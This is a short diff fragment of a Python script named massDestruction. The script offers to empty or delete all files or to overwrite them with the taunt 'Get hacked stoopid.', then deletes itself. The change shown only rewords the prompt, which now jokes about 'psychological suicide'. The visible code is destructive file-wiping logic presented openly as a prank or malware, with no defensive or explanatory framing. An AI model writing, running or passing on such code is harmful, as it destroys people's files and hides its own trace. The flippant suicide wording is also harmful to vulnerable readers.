@@ -20,4 +20,4 @@ def massDestruction(levelOfDestruction):
                     if levelOfDestruction=="P":
                         toBeDeleted.write("Get hacked stoopid.")
     os.remove(os.path.basename(__file__))
-massDestruction(input("Would you like to (P)sychologically destroy yourself, (E)mpty all files, or (D)elete all files? "))
+massDestruction(input("Would you like to commit (P)sychological suicide, (E)mpty all files, or (D)elete all files? "))
